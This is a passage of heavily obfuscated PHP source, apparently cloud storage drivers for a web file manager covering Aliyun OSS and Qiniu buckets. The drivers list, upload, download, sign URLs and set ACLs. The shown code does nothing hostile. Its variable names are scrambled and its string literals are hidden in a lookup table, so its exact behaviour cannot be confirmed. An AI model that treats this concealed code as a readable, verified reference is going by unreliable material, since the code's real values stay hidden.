!trim($ÃÈÉÊú‚[$ñùÜù…µ[85]])) { $ÃÈÉÊú‚[$ñùÜù…µ[85]] = $ƒÃÃÙ†Ÿ[$ñùÜù…µ[180]]; } return $ÃÈÉÊú‚; } private function folderInfo($Åãò±ã¡, $µóÉÄ¶ = false, $×ÉŸÖú¯ = array()) { $¿ºÏñÑ  =& $_SERVER[¡“ËÌ§œ]; $ŞŠ‹ùô = array($¿ºÏñÑ [32] => $this->pathThis($Åãò±ã¡), $¿ºÏñÑ [84] => $this->getPathOuter($¿ºÏñÑ [8] . $Åãò±ã¡), $¿ºÏñÑ [33] => $¿ºÏñÑ [75]); if ($µóÉÄ¶) { return $ŞŠ‹ùô; } $ŞŠ‹ùô[$¿ºÏñÑ [201]] = $ŞŠ‹ùô[$¿ºÏñÑ [85]] = 0; $ŞŠ‹ùô[$¿ºÏñÑ [202]] = $ŞŠ‹ùô[$¿ºÏñÑ [203]] = !0; if (empty($×ÉŸÖú¯)) { $Åãò±ã¡ = rtrim($Åãò±ã¡, $¿ºÏñÑ [8]) . $¿ºÏñÑ [8]; $³“Ç¾Îå = $this->objectMeta($Åãò±ã¡); if (!$³“Ç¾Îå) { return $ŞŠ‹ùô; } $×ÉŸÖú¯ = array($¿ºÏñÑ [201] => $³“Ç¾Îå[$¿ºÏñÑ [540]][$¿ºÏñÑ [1411]], $¿ºÏñÑ [85] => strtotime($³“Ç¾Îå[$¿ºÏñÑ [1404]])); } if (isset($×ÉŸÖú¯[$¿ºÏñÑ [85]])) { $ŞŠ‹ùô[$¿ºÏñÑ [85]] = $×ÉŸÖú¯[$¿ºÏñÑ [85]]; } if (isset($×ÉŸÖú¯[$¿ºÏñÑ [201]])) { $ŞŠ‹ùô[$¿ºÏñÑ [201]] = $×ÉŸÖú¯[$¿ºÏñÑ [201]]; } return $ŞŠ‹ùô; } public function listPath($÷Êüö÷, $‘‰«ß× = false) { $ûÏÖÆö” =& $_SERVER[¡“ËÌ§œ]; $¨ê„ã­ = $this->fileList($÷Êüö÷, $ûÏÖÆö”[8], !0); foreach ($¨ê„ã­[$ûÏÖÆö”[82]] as $Ú•šÓîÃ => $ŞˆÓú°Å) { $¨ê„ã­[$ûÏÖÆö”[82]][$Ú•šÓîÃ] = $this->folderInfo($ŞˆÓú°Å, $‘‰«ß×, $ŞˆÓú°Å); } foreach ($¨ê„ã­[$ûÏÖÆö”[83]] as $Ú•šÓîÃ => $ŞˆÓú°Å) { $¨ê„ã­[$ûÏÖÆö”[83]][$Ú•šÓîÃ] = $this->fileInfo($ŞˆÓú°Å[$ûÏÖÆö”[32]], $‘‰«ß×, $ŞˆÓú°Å); } return $¨ê„ã­; } protected function infoChildren($„Ÿ›á®’, &$™È¨æ”) { $šàµ›° =& $_SERVER[¡“ËÌ§œ]; $±ó²·ò¼ = $this->fileList($„Ÿ›á®’, $šàµ›°[12], !0); $™È¨æ”[$šàµ›°[78]] += count($±ó²·ò¼[$šàµ›°[82]]); $™È¨æ”[$šàµ›°[77]] += count($±ó²·ò¼[$šàµ›°[83]]); foreach ($±ó²·ò¼[$šàµ›°[83]] as $ĞÑÙğÅ­) { if (!$ĞÑÙğÅ­ || !$ĞÑÙğÅ­[$šàµ›°[76]]) { continue; } $™È¨æ”[$šàµ›°[76]] += $ĞÑÙğÅ­[$šàµ›°[76]]; } } public function has($Ó›éññõ, $Í€ÅÛ‹ = false, $Î²î˜† = true) { $Ô­íĞÏ™ =& $_SERVER[¡“ËÌ§œ]; $Ó›éññõ = trim($Ó›éññõ, $Ô­íĞÏ™[8]); $½À¼¡Åš = empty($Ó›éññõ) && $Ó›éññõ !== $Ô­íĞÏ™[198] ? $Ô­íĞÏ™[12] : $Ó›éññõ . $Ô­íĞÏ™[8]; $æö¶âÑ² = $Ô­íĞÏ™[12]; $½º›¿ô½ = 500; $ƒáÊÌ²« = $€Âğú³€ = 0; while (!0) { check_abort(); $èôûçÑë = array($Ô­íĞÏ™[1399] => $Ô­íĞÏ™[8], $Ô­íĞÏ™[1400] => $½À¼¡Åš, $Ô­íĞÏ™[1401] => $½º›¿ô½, $Ô­íĞÏ™[1402] => $æö¶âÑ²); try { $ÈìÇùˆ = $this->client->listObjects($this->bucket, $èôûçÑë); } catch (OSS\Core\OssException $éÂéÑÈ) { break; } $æö¶âÑ² = $ÈìÇùˆ->getNextMarker(); $Œ»ò¬† = $ÈìÇùˆ->getObjectList(); $Æ…Ší·ë = $ÈìÇùˆ->getPrefixList(); if ($Í€ÅÛ‹) { if (count($Œ»ò¬†) > 1 || count($Œ»ò¬†) == 1 && $Œ»ò¬†[0]->getKey() != $½À¼¡Åš) { $ƒáÊÌ²« += count($Œ»ò¬†) - 1; } if (!empty($Æ…Ší·ë)) { $€Âğú³€ += count($Æ…Ší·ë); } if ($æö¶âÑ² === $Ô­íĞÏ™[12]) { break; } continue; } if ($Î²î˜†) { if (!empty($Œ»ò¬†)) { if (count($Œ»ò¬†) > 1 || $Œ»ò¬†[0]->getKey() != $½À¼¡Åš) { return !0; } } } else { if (!empty($Æ…Ší·ë)) { return !0; } } if ($æö¶âÑ² === $Ô­íĞÏ™[12]) { break; } } if ($Í€ÅÛ‹) { return array($Ô­íĞÏ™[207] => $ƒáÊÌ²«, $Ô­íĞÏ™[208] => $€Âğú³€); } return !1; } public function listAll($¯€šÑ“±) { $ÂÙ¦àË =& $_SERVER[¡“ËÌ§œ]; $×Ø›•İš = $this->fileList($¯€šÑ“±, $ÂÙ¦àË[12], !0); $º‰Ó˜áÇ = array_to_keyvalue($×Ø›•İš[$ÂÙ¦àË[83]], $ÂÙ¦àË[32]); foreach ($×Ø›•İš[$ÂÙ¦àË[82]] as $ÖóÎÁÅà) { if (is_string($ÖóÎÁÅà)) { $º‰Ó˜áÇ[$ÖóÎÁÅà] = array($ÂÙ¦àË[76] => 0); } } return $this->listAllFiles($¯€šÑ“±, $º‰Ó˜áÇ); } public function canRead($Ÿà) { $’ú¿İ½Ë =& $_SERVER[¡“ËÌ§œ]; $ÊŸ ‘ì† = $this->pathAcl($Ÿà); return $ÊŸ ‘ì† == $’ú¿İ½Ë[1412] || $ÊŸ ‘ì† == $’ú¿İ½Ë[585] ? !0 : !1; } public function canWrite($á…«²¹) { $š‡öÂÎ = $this->pathAcl($á…«²¹); return $š‡öÂÎ == $_SERVER[¡“ËÌ§œ][585] ? !0 : !1; } public function pathAcl($ëëªš¸¹) { $¿ÙÅ”êä =& $_SERVER[¡“ËÌ§œ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $âá¥óĞ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ëëªš¸¹)); } catch (OSS\Core\OssException $ùâÏŞ¡¤) { return !1; } $òı›Áî¨ = $âá¥óĞ == $¿ÙÅ”êä[37] ? $this->bucketAcl : $âá¥óĞ; if ($òı›Áî¨ == $¿ÙÅ”êä[1413]) { return $¿ÙÅ”êä[1412]; } if ($òı›Áî¨ == $¿ÙÅ”êä[1414]) { return $¿ÙÅ”êä[585]; } return $òı›Áî¨; } private function chmodPath($˜ìº†Ê¢, $‘ùîÔÜÏ = '') { $‰üÏ©æş =& $_SERVER[¡“ËÌ§œ]; $÷ÂÑçªÛ = empty($‘ùîÔÜÏ) ? $‰üÏ©æş[1414] : $‘ùîÔÜÏ; $Ëı˜§Ğ‰ = array($‰üÏ©æş[37], $‰üÏ©æş[199], $‰üÏ©æş[1413], $‰üÏ©æş[1414]); if (!in_array($÷ÂÑçªÛ, $Ëı˜§Ğ‰)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($˜ìº†Ê¢), $÷ÂÑçªÛ); } catch (OSS\Core\OssException $üÏæˆ½¢) { return !1; } return !0; } public function getContent($‚´ÕŠáú) { return $this->fileSubstr($‚´ÕŠáú, -1); } public function setContent($°ïóõè­, $¤†’îõ» = '') { $Æ­©ˆ”ç =& $_SERVER[¡“ËÌ§œ]; try { $¬ËÓ„ğÌ = $this->trafficLimit($Æ­©ˆ”ç[1415]); $÷ŞŸıû„ = $this->client->putObject($this->bucket, $this->pathEncode($°ïóõè­), $¤†’îõ», $¬ËÓ„ğÌ); } catch (OSS\Core\OssException $ŸáÖ»óø) { return !1; } $ÀôŠ¥¼ = array($Æ­©ˆ”ç[1405] => trim($÷ŞŸıû„[$Æ­©ˆ”ç[1416]], $Æ­©ˆ”ç[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($°ïóõè­))); $this->updateObjMeta($°ïóõè­, $ÀôŠ¥¼); return isset($÷ŞŸıû„[$Æ­©ˆ”ç[1417]][$Æ­©ˆ”ç[260]]) ? !0 : !1; } private function updateObjMeta($ìÂª¬‰˜, $”¹Ô×½Ä) { $ìÂª¬‰˜ = $this->pathEncode($ìÂª¬‰˜); try { $Š©æ¿œµ = array(OSS\OssClient::OSS_HEADERS => $”¹Ô×½Ä); $this->client->copyObject($this->bucket, $ìÂª¬‰˜, $this->bucket, $ìÂª¬‰˜, $Š©æ¿œµ); } catch (OSS\Core\OssException $¨Õ¥ó÷) { return !1; } return !0; } public function upload($ ŞôÕ‡ù, $»àû³, $µÚ±é• = false, $»çñŒÇ = REPEAT_REPLACE) { $á½ä¦ˆš =& $_SERVER[¡“ËÌ§œ]; $ïÄ€ÒÖ = trim($ ŞôÕ‡ù, $á½ä¦ˆš[8]); $¼é ÆÎ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($á½ä¦ˆš[1405] => @md5_file($»àû³)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ ŞôÕ‡ù))); $¼é ÆÎ = $this->trafficLimit($á½ä¦ˆš[1415], $¼é ÆÎ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ïÄ€ÒÖ), $»àû³, $¼é ÆÎ); } catch (OSS\Core\OssException $²İ€Æ”¥) { return !1; } return $this->getPathOuter($ ŞôÕ‡ù); } public function getHost() { $èÉ’Áœ° =& $_SERVER[¡“ËÌ§œ]; $åŞĞ°ø˜ = explode($èÉ’Áœ°[184], parent::getHost()); return $åŞĞ°ø˜[0] . $èÉ’Áœ°[184] . $this->bucket . $èÉ’Áœ°[10] . $åŞĞ°ø˜[1]; } public function uploadFormData($¿›ª†Ë£, $ï’´ÖÙÇ = 3600) { $³ªŞçì™ =& $_SERVER[¡“ËÌ§œ]; if (!($µÙó¦ó… = $this->getHost())) { return !1; } $Ã‡ŸØÍÌ = $ï’´ÖÙÇ; $Ë ¿€ó¾ = date($³ªŞçì™[1418], time() + $Ã‡ŸØÍÌ); $şÓì™ú… = new DateTime($Ë ¿€ó¾); $ª²ø€í¸ = $şÓì™ú…->format(DateTime::ISO8601); $‘†§ëÂ = strpos($ª²ø€í¸, $³ªŞçì™[325]); $ª²ø€í¸ = substr($ª²ø€í¸, 0, $‘†§ëÂ) . $³ªŞçì™[1419]; $ÑñÔ‚‘ƒ = 1048576000 * 5; $îÏöîÔ« = $this->pathFather($¿›ª†Ë£); $Åø—÷š´ = array($³ªŞçì™[243] => $ª²ø€í¸, $³ªŞçì™[246] => array(array($³ªŞçì™[1420], 0, $ÑñÔ‚‘ƒ), array($³ªŞçì™[249], $³ªŞçì™[250], $îÏöîÔ«))); $»ïğüÇŠ = base64_encode(json_encode($Åø—÷š´)); $™ºáùÓĞ = base64_encode(hash_hmac($³ªŞçì™[232], $»ïğüÇŠ, $this->secret, !0)); $ùÀ¢ÜÊÃ = array($³ªŞçì™[261] => $»ïğüÇŠ, $³ªŞçì™[1421] => $this->accessKey, $³ªŞçì™[253] => $³ªŞçì™[242], $³ªŞçì™[1422] => $™ºáùÓĞ, $³ªŞçì™[182] => $µÙó¦ó…); $ùÀ¢ÜÊÃ = $this->trafficLimit($³ªŞçì™[1415], $ùÀ¢ÜÊÃ); return $ùÀ¢ÜÊÃ; } public function multiUploadFormData($ãë„Úğá, $¿à„àº = 3600) { $Åö‘ÀŒõ =& $_SERVER[¡“ËÌ§œ]; if (!($Ì‘ôÁüı = $this->getHost())) { return !1; } $›ÙºÊ‡ß = $this->trafficLimit($Åö‘ÀŒõ[1415]); $üÁÃºã– = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ãë„Úğá), $›ÙºÊ‡ß); return array($Åö‘ÀŒõ[223] => $üÁÃºã–, $Åö‘ÀŒõ[182] => $Ì‘ôÁüı . $Åö‘ÀŒõ[8] . $this->pathEncode($ãë„Úğá), $Åö‘ÀŒõ[224] => gmdate($Åö‘ÀŒõ[1423]), $Åö‘ÀŒõ[94] => $ãë„Úğá); } public function multiUploadAuthData($ƒêöêŞ®, $Ïş¦œÊ° = array()) { $ğøê¯óø =& $_SERVER[¡“ËÌ§œ]; $õã»ÇãÎ = isset($Ïş¦œÊ°[$ğøê¯óø[224]]) ? $Ïş¦œÊ°[$ğøê¯óø[224]] : gmdate($ğøê¯óø[1423]); $îÁµî³¾ = isset($Ïş¦œÊ°[$ğøê¯óø[174]]) ? $Ïş¦œÊ°[$ğøê¯óø[174]] : $ğøê¯óø[12]; $€§Ëá•Î = $ƒêöêŞ®; if (isset($Ïş¦œÊ°[$ğøê¯óø[94]])) { $€§Ëá•Î = $Ïş¦œÊ°[$ğøê¯óø[94]]; unset($Ïş¦œÊ°[$ğøê¯óø[94]]); } if (isset($Ïş¦œÊ°[$ğøê¯óø[225]])) { $Ïş¦œÊ°[$ğøê¯óø[224]] = $õã»ÇãÎ; return $this->listUploadParts($€§Ëá•Î, $Ïş¦œÊ°); } $–»øïòá = array($ğøê¯óø[226], $ğøê¯óø[12], $ğøê¯óø[120], $õã»ÇãÎ, "\170\55\157\163\163\55\144\141\x74\145\x3a{$õã»ÇãÎ}", $ğøê¯óø[8] . $this->bucket . $ğøê¯óø[8] . $€§Ëá•Î . $îÁµî³¾); if (strpos($îÁµî³¾, $ğøê¯óø[227]) === 0) { $–»øïòá[0] = $ğøê¯óø[228]; if ($ÚÔ×â¼® = $this->trafficLimit($ğøê¯óø[1415])) { $€§Ëá•Î = $ğøê¯óø[1424]; array_splice($–»øïòá, 5, 0, $€§Ëá•Î . $ğøê¯óø[4] . $ÚÔ×â¼®[$€§Ëá•Î]); } } if (isset($Ïş¦œÊ°[$ğøê¯óø[229]]) && $Ïş¦œÊ°[$ğøê¯óø[229]] == $ğøê¯óø[230]) { $–»øïòá[0] = $ğøê¯óø[230]; } if (!empty($Ïş¦œÊ°[$ğøê¯óø[1425]])) { $•æ§Š¿½ = array_merge(array($–»øïòá[4]), $Ïş¦œÊ°[$ğøê¯óø[1425]]); sort($•æ§Š¿½); $–»øïòá[4] = implode($ğøê¯óø[231], $•æ§Š¿½); } $‰ÌĞÀ = implode($ğøê¯óø[231], $–»øïòá); $‘Ó×¦ë· = base64_encode(hash_hmac($ğøê¯óø[232], $‰ÌĞÀ, $this->secret, !0)); $ÜÉöØ² = $ğøê¯óø[1389] . $this->accessKey . $ğøê¯óø[4] . $‘Ó×¦ë·; if (strpos($îÁµî³¾, $ğøê¯óø[227]) === 0) { $ÜÉöØ² = array($ğøê¯óø[234] => $ÜÉöØ², $ğøê¯óø[224] => $õã»ÇãÎ); if ($ÚÔ×â¼®) { $ÜÉöØ² = array_merge($ÜÉöØ², $ÚÔ×â¼®); } } return $ÜÉöØ²; } public function listUploadParts($Ô¬¨Ò‡£, $ÀÖÜË“­) { $ãœÏ ± =& $_SERVER[¡“ËÌ§œ]; $®€§í× = parse_url_query($ÀÖÜË“­[$ãœÏ ±[174]]); $—»Í°¼ = $this->client->listParts($this->bucket, $this->pathEncode($Ô¬¨Ò‡£), $®€§í×[$ãœÏ ±[223]]); $˜Åî¯ù¥ = $—»Í°¼->getListPart(); $‡‘äØ­Í = array(); foreach ($˜Åî¯ù¥ as $Áé¸ ºÓ) { $‡‘äØ­Í[] = array($ãœÏ ±[1409] => $Áé¸ ºÓ->getPartNumber(), $ãœÏ ±[1410] => trim($Áé¸ ºÓ->getETag(), $ãœÏ ±[118])); } unset($ÀÖÜË“­[$ãœÏ ±[225]], $ÀÖÜË“­[$ãœÏ ±[229]]); $ò¸­Øú¤ = $this->multiUploadAuthData($Ô¬¨Ò‡£, $ÀÖÜË“­); if (empty($ò¸­Øú¤)) { return !1; } return array($ãœÏ ±[234] => $ò¸­Øú¤, $ãœÏ ±[224] => $ÀÖÜË“­[$ãœÏ ±[224]], $ãœÏ ±[236] => $‡‘äØ­Í); } public function download($Ñ„Ğ¶³½, $èØ‹Á©) { if ($this->isFolder($Ñ„Ğ¶³½)) { return !1; } try { $Õşï™ôÎ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $èØ‹Á©); $Õşï™ôÎ = $this->trafficLimit($_SERVER[¡“ËÌ§œ][109], $Õşï™ôÎ); $this->client->getObject($this->bucket, $this->pathEncode($Ñ„Ğ¶³½), $Õşï™ôÎ); } catch (OSS\Core\OssException $ÀåÅæŞ¢) { return !1; } return $èØ‹Á©; } public function fileSubstr($çáÁ¬É‘, $Ùûı£µ = 0, $É‰ñ®è = false) { if ($Ùûı£µ === -1) { $§ÌÈ¡åœ = array(); } else { if ($É‰ñ®è === !1) { $Ä¶ùƒ¶ = $this->size($çáÁ¬É‘); } else { $Ä¶ùƒ¶ = $Ùûı£µ + $É‰ñ®è - 1; } $§ÌÈ¡åœ = array(OSS\OssClient::OSS_RANGE => "{$Ùûı£µ}\55{$Ä¶ùƒ¶}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($çáÁ¬É‘), $§ÌÈ¡åœ); } catch (OSS\Core\OssException $î‚š‹Û¨) { think_exception($î‚š‹Û¨->getMessage()); return !1; } } private function trafficLimit($°Õ§Ã‹, $£¢ÛÁ¯« = array()) { $¾ÉÕã¹— =& $_SERVER[¡“ËÌ§œ]; if ($°Õ§Ã‹ == $¾ÉÕã¹—[1415] && $this->isUploadServer() || $°Õ§Ã‹ == $¾ÉÕã¹—[109] && $this->isFileOutServer()) { return $£¢ÛÁ¯«; } $Ì€­ŒÈ = floatval($GLOBALS[$¾ÉÕã¹—[6]][$¾ÉÕã¹—[89]][$¾ÉÕã¹—[107]][$°Õ§Ã‹]) * 1024 * 1024 * 8; if (!$Ì€­ŒÈ) { return $£¢ÛÁ¯«; } $Ì€­ŒÈ = $Ì€­ŒÈ < 819200 ? 819200 : ($Ì€­ŒÈ > 838860800 ? 838860800 : $Ì€­ŒÈ); $£¢ÛÁ¯«[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ì€­ŒÈ); return $£¢ÛÁ¯«; } public function link($Ò¿ò™Ê, $ÖŠäßú£ = array()) { $ÌÁÏ©±é =& $_SERVER[¡“ËÌ§œ]; if (!$this->exist($Ò¿ò™Ê) || $this->isFolder($Ò¿ò™Ê)) { return !1; } try { $ÖŠäßú£ = $this->trafficLimit($ÌÁÏ©±é[109], $ÖŠäßú£); $¼ƒ¶ŞÑ = $this->client->signUrl($this->bucket, $this->pathEncode($Ò¿ò™Ê), 3600 * 12, $ÌÁÏ©±é[230], $ÖŠäßú£); return $this->getCdnLink($¼ƒ¶ŞÑ); } catch (OSS\Core\OssException $°İ¸§Âå) { return !1; } } public function fileOut($˜ç«áıÃ, $à½„Ù = false, $ŠÆ‰ÀºÂ = false, $äšº°¸â = '') { $ÓŞé“ˆÈ =& $_SERVER[¡“ËÌ§œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($˜ç«áıÃ, $à½„Ù, $ŠÆ‰ÀºÂ, $äšº°¸â); } if (!$ŠÆ‰ÀºÂ) { $ŠÆ‰ÀºÂ = $this->pathThis($˜ç«áıÃ); } $ŠÆ‰ÀºÂ = rawurlencode($ŠÆ‰ÀºÂ); $ÕŸÊíß¼ = get_file_mime(get_path_ext($ŠÆ‰ÀºÂ)); if ($ÕŸÊíß¼ == $ÓŞé“ˆÈ[217]) { return parent::fileOut($˜ç«áıÃ, $à½„Ù, $ŠÆ‰ÀºÂ, $äšº°¸â); } $à½„Ù = $à½„Ù ? $ÓŞé“ˆÈ[1426] : $ÓŞé“ˆÈ[1427]; $»§–Ã½” = array(OSS\OssClient::OSS_SUB_RESOURCE => $ÓŞé“ˆÈ[1428] . rawurlencode("{$à½„Ù}\x3b\146\x69\154\145\x6e\x61\x6d\x65\75{$ŠÆ‰ÀºÂ}")); $»§–Ã½”[OSS\OssClient::OSS_SUB_RESOURCE] .= $ÓŞé“ˆÈ[1429] . rawurlencode($ÕŸÊíß¼); $¾¢”Š•ş = $this->link($˜ç«áıÃ, $»§–Ã½”); $this->fileOutLink($¾¢”Š•ş); } public function fileOutServer($—Éïå, $ÃïÏÙÔÉ = false, $Î›ôÅäû = false, $„È¼‚…ˆ = '') { parent::fileOut($—Éïå, $ÃïÏÙÔÉ, $Î›ôÅäû, $„È¼‚…ˆ); } public function fileOutImage($«²Ç¬ä×, $¨¨ªÂ‚² = 250) { if ($this->size($«²Ç¬ä×) > 1024 * 1024 * 20) { return $this->fileOutImageServer($«²Ç¬ä×, $¨¨ªÂ‚²); } $ ¥š…ù” = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¡“ËÌ§œ][1430] . $¨¨ªÂ‚²); $Ÿ†ØçÛ = $this->link($«²Ç¬ä×, $ ¥š…ù”); $this->fileOutLink($Ÿ†ØçÛ); } public function fileOutImageServer($şñ©¨¯Å, $ÓÒ¯—êÎ = 250) { parent::fileOutImage($şñ©¨¯Å, $ÓÒ¯—êÎ); } public function fileOutLink($´¯±»¹ª) { $£¸Õ‹Ï… =& $_SERVER[¡“ËÌ§œ]; if (!$this->isCdnHost() && substr($´¯±»¹ª, 0, 7) == $£¸Õ‹Ï…[1351]) { $´¯±»¹ª = $£¸Õ‹Ï…[1352] . substr($´¯±»¹ª, 7); } header($£¸Õ‹Ï…[161] . $´¯±»¹ª); die; } public function hashMd5($æ×»ìõå, $Å±ÅŞÈ = '') { $“ìÁœ× =& $_SERVER[¡“ËÌ§œ]; $Ü“¶ï–Ú = $this->_objectMeta($æ×»ìõå); if (!$Ü“¶ï–Ú) { return $“ìÁœ×[12]; } if (!isset($Ü“¶ï–Ú[$“ìÁœ×[1405]]) && !empty($Å±ÅŞÈ)) { $ğ“£ÇœÜ = $this->updateObjMeta($æ×»ìõå, array($“ìÁœ×[1405] => $Å±ÅŞÈ)); $Ü“¶ï–Ú[$“ìÁœ×[1405]] = $ğ“£ÇœÜ ? $Å±ÅŞÈ : $“ìÁœ×[12]; } return isset($Ü“¶ï–Ú[$“ìÁœ×[1405]]) ? strtolower($Ü“¶ï–Ú[$“ìÁœ×[1405]]) : $“ìÁœ×[12]; } public function size($âƒçëî) { $‡ú¤öÁõ = $this->objectMeta($âƒçëî); return $‡ú¤öÁõ ? $‡ú¤öÁõ[$_SERVER[¡“ËÌ§œ][76]] : 0; } public function info($ğ¡·‚ß») { if ($this->isFolder($ğ¡·‚ß»)) { return $this->folderInfo($ğ¡·‚ß»); } else { if ($this->isFile($ğ¡·‚ß»)) { return $this->fileInfo($ğ¡·‚ß»); } } return !1; } public function exist($­ÑÑì¢Æ) { return $this->isFile($­ÑÑì¢Æ) || $this->isFolder($­ÑÑì¢Æ); } public function isFile($»ÀÚ›ı ) { return !$this->isFolder($»ÀÚ›ı ) && $this->objectMeta($»ÀÚ›ı ); } public function isFolder($øúÁ„Ã) { return $this->cacheMethod($_SERVER[¡“ËÌ§œ][165], $øúÁ„Ã); } protected function objectMeta($¤ãÔíè³) { return $this->cacheMethod($_SERVER[¡“ËÌ§œ][167], $¤ãÔíè³); } protected function _objectMeta($öôÈ¢¸Ï) { $ÎÆ‡Î¦ =& $_SERVER[¡“ËÌ§œ]; try { $™çÑöé– = $this->client->getObjectMeta($this->bucket, $this->pathEncode($öôÈ¢¸Ï)); } catch (OSS\Core\OssException $Õ²²Öğƒ) { $™çÑöé– = !1; } if ($™çÑöé–) { $™çÑöé–[$ÎÆ‡Î¦[76]] = intval($™çÑöé–[$ÎÆ‡Î¦[1403]]); } return $™çÑöé–; } protected function _isFolder($ªİİÜ¶Ú) { $ıÇÏü£Ç =& $_SERVER[¡“ËÌ§œ]; if ($ªİİÜ¶Ú == $ıÇÏü£Ç[12] || $ªİİÜ¶Ú == $ıÇÏü£Ç[8]) { return !0; } $¸øÖˆÄá = array($ıÇÏü£Ç[1399] => $ıÇÏü£Ç[8], $ıÇÏü£Ç[1400] => rtrim($ªİİÜ¶Ú, $ıÇÏü£Ç[8]) . $ıÇÏü£Ç[8], $ıÇÏü£Ç[1401] => 1, $ıÇÏü£Ç[1402] => $ıÇÏü£Ç[12]); $šî“™Á = $this->client->listObjects($this->bucket, $¸øÖˆÄá); if ($šî“™Á->getObjectList() || $šî“™Á->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ï±š­ö) { parent::__construct(); require_once SDK_DIR . $_SERVER[¡“ËÌ§œ][1431]; $this->_init($ï±š­ö); } public function _init($ì¼£•Ãñ) { $Ç°À¼² =& $_SERVER[¡“ËÌ§œ]; $this->config = $ì¼£•Ãñ; foreach ($ì¼£•Ãñ as $üˆ´Ÿ => $¹¿£—·±) { if (isset($this->{$üˆ´Ÿ})) { $this->{$üˆ´Ÿ} = $¹¿£—·±; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ç°À¼²[1432] . LNG($Ç°À¼²[1390])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Òœ”¦Î›, $‹ÈŞ°¤€ = '', $íöİÌœ = REPEAT_RENAME) { if ($this->setContent($Òœ”¦Î›, $‹ÈŞ°¤€)) { return $this->getPathOuter($Òœ”¦Î›); } return !1; } public function mkdir($×Êì…Ñ , $ÏÒÍ¯Øà = REPEAT_SKIP) { $Û•µŠìŸ =& $_SERVER[¡“ËÌ§œ]; $ÂöËñ„ë = trim($×Êì…Ñ , $Û•µŠìŸ[8]); if ($this->_isFolder($ÂöËñ„ë)) { return $this->getPathOuter($ÂöËñ„ë); } $×Êì…Ñ  = $ÂöËñ„ë . $Û•µŠìŸ[8]; $úòõ·ğ¥ = get_path_this($ÂöËñ„ë); $Áİ¶®Ü× = $×Êì…Ñ  . $úòõ·ğ¥; if (!$this->mkfile($Áİ¶®Ü×)) { return !1; } if (!$this->moveFile($Áİ¶®Ü×, $×Êì…Ñ )) { $this->delFile($Áİ¶®Ü×); return !1; } return $this->getPathOuter($ÂöËñ„ë); } public function copyFile($ßÈ¸»ª, $ÂÙÜŠş) { $ŞÏõÇé« = $this->bucketManager->copy($this->bucket, $ßÈ¸»ª, $this->bucket, $ÂÙÜŠş, !0); return $ŞÏõÇé« ? !1 : $this->getPathOuter($ÂÙÜŠş); } public function moveFile($½°Ô“ı, $ßºùÜû‡) { $èı‹ÓÈù = $this->bucketManager->move($this->bucket, $½°Ô“ı, $this->bucket, $ßºùÜû‡, !0); return $èı‹ÓÈù ? !1 : $this->getPathOuter($ßºùÜû‡); } public function delFile($ Ë—¬ê™) { if (!$this->exist($ Ë—¬ê™)) { return !0; } $šØËÈ˜— = $this->bucketManager->delete($this->bucket, $ Ë—¬ê™); return $šØËÈ˜— ? !1 : !0; } public function delFolder($Åõ•‡š³) { $Š·­ğ«¹ =& $_SERVER[¡“ËÌ§œ]; if (!$this->exist($Åõ•‡š³)) { return !0; } $this->listItemCache = !1; $ü•©ƒ = $this->fileList($Åõ•‡š³); $this->listItemCache = !0; $˜â‚¨Üç = trim($Åõ•‡š³, $Š·­ğ«¹[8]) . $Š·­ğ«¹[8]; if (!empty($Åõ•‡š³) && $Åõ•‡š³ !== $Š·­ğ«¹[198] && !in_array($˜â‚¨Üç, $ü•©ƒ[$Š·­ğ«¹[82]])) { $ü•©ƒ[$Š·­ğ«¹[82]][] = $˜â‚¨Üç; } $ÍÖ²Ÿ×© = $this->delByBatch($ü•©ƒ[$Š·­ğ«¹[83]]); if (!$ÍÖ²Ÿ×©) { return !1; } $ÍÖ²Ÿ×© = $this->delByBatch($ü•©ƒ[$Š·­ğ«¹[82]]); if (!$ÍÖ²Ÿ×©) { return !1; } return $this->delFile($˜â‚¨Üç); } private function delByBatch($¶êÆÖüå) { foreach (array_chunk($¶êÆÖüå, 1000) as $€ñ°€î£) { $©ÔÆ‹ÄÛ = $this->bucketManager->buildBatchDelete($this->bucket, $€ñ°€î£); list($×®× È­, $‰Òã¼…Ş) = $this->bucketManager->batch($©ÔÆ‹ÄÛ); if ($‰Òã¼…Ş) { return !1; } } return !0; } public function rename($Ÿ¾Œøå”, $ı·º¸Ö’) { return $this->renameObject($Ÿ¾Œøå”, $ı·º¸Ö’); } public function fileInfo($´ÕõÒ÷¦, $«Õ÷Õ = false, $°ùî´µÈ = array()) { $•ëÛÚ» =& $_SERVER[¡“ËÌ§œ]; $³¯ãËá = array($•ëÛÚ»[32] => $this->pathThis($´ÕõÒ÷¦), $•ëÛÚ»[84] => $this->getPathOuter($•ëÛÚ»[8] . $´ÕõÒ÷¦), $•ëÛÚ»[33] => $•ëÛÚ»[200], $•ëÛÚ»[76] => isset($°ùî´µÈ[$•ëÛÚ»[1433]]) ? $°ùî´µÈ[$•ëÛÚ»[1433]] : 0, $•ëÛÚ»[174] => 